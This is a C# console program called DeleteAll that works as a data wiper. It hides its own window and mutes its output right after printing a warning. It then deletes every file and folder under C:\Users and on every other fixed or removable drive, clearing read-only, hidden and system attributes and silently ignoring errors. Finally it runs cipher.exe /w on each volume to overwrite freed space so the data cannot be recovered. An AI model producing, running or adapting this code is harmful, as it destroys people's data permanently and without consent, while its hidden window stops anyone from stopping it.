using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class DeleteAll
{
    // --- Windows API imports to hide the console window ---
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    static void Main()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("!!! WARNING !!!");
        Console.WriteLine("This will PERMANENTLY destroy:");

        // ==========================================
        // STEALTH MODE ACTIVATED
        // ==========================================
        
        // 1. Hide the console window
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // 2. Redirect Console output to Null so background output doesn't hang the app
        Console.SetOut(TextWriter.Null);

        // ---- Detect volumes ----
        var volumes = new List<(string VolumeRoot, string TargetPath)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                if (!drive.IsReady) continue;
                if (drive.DriveType != DriveType.Fixed && drive.DriveType != DriveType.Removable) continue;

                string root = drive.RootDirectory.FullName;
                if (string.IsNullOrEmpty(root)) continue;
                if (!seen.Add(root)) continue; // Skip duplicates

                string target = root.Equals(@"C:\", StringComparison.OrdinalIgnoreCase)
                    ? @"C:\Users"
                    : root;

                volumes.Add((root, target));
            }
            catch { /* Skip locked/empty drives silently */ }
        }

        if (volumes.Count == 0) return;

        // ---- Process each volume sequentially ----
        foreach (var v in volumes)
        {
            if (Directory.Exists(v.TargetPath))
            {
                DeleteContentsFast(v.TargetPath);
            }

            // Run cipher silently on the volume root
            RunCipher(v.VolumeRoot);
        }

        // After everything is done, kill the process instantly and silently.
        
    }

    static void DeleteContentsFast(string rootPath)
    {
        try
        {
            var di = new DirectoryInfo(rootPath);
            if ((di.Attributes & FileAttributes.ReadOnly) != 0)
                di.Attributes &= ~FileAttributes.ReadOnly;
        }
        catch { }

        var stack = new Stack<string>();
        var dirsToDelete = new List<string>();
        stack.Push(rootPath);

        while (stack.Count > 0)
        {
            string current = stack.Pop();
            dirsToDelete.Add(current);

            // Delete files in this directory
            string[] files;
            try { files = Directory.GetFiles(current); }
            catch { files = Array.Empty<string>(); }
            
            foreach (var f in files) TryDeleteFile(f);

            // Queue sub-directories
            string[] subs;
            try { subs = Directory.GetDirectories(current); }
            catch { subs = Array.Empty<string>(); }
            
            foreach (var d in subs) stack.Push(d);
        }

        // Delete directories deepest-first, skipping the root itself
        for (int i = dirsToDelete.Count - 1; i >= 0; i--)
        {
            string d = dirsToDelete[i];
            if (string.Equals(d, rootPath, StringComparison.OrdinalIgnoreCase)) continue;

            try
            {
                var di = new DirectoryInfo(d);
                var attrs = di.Attributes;
                if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
                if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
                if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
                if (attrs != di.Attributes) di.Attributes = attrs;

                // Handle Long Paths (> 260 chars) natively
                string longPath = d.StartsWith(@"\\?\") ? d : @"\\?\" + d;
                Directory.Delete(longPath, false);
            }
            catch { /* Ignore dirs that are locked or in use */ }
        }
    }

    static void TryDeleteFile(string path)
    {
        try
        {
            var fi = new FileInfo(path);
            if (!fi.Exists) return;

            var attrs = fi.Attributes;
            if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
            if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
            if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
            if (attrs != fi.Attributes) fi.Attributes = attrs;

            // Handle Long Paths (> 260 chars) natively
            string longPath = path.StartsWith(@"\\?\") ? path : @"\\?\" + path;
            File.Delete(longPath);
        }
        catch { /* Ignore files that are locked, in-use, or require permissions */ }
    }

    static void RunCipher(string volumeRoot)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cipher.exe",
                Arguments = $"/w:{volumeRoot}",
                UseShellExecute = false,
                CreateNoWindow = true,            // Hides the cipher window completely
                RedirectStandardOutput = true,    // Prevents blocking
                RedirectStandardError = true      // Prevents blocking
            };

            using var p = Process.Start(psi);
            if (p != null)
            {
                // We must actively read the output, otherwise cipher.exe will freeze
                // when its internal buffer fills up during large wipes.
                p.OutputDataReceived += (s, e) => { };
                p.ErrorDataReceived += (s, e) => { };
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                p.WaitForExit(); // Wait until the drive is fully wiped
            }
        }
        catch { }
    }
}
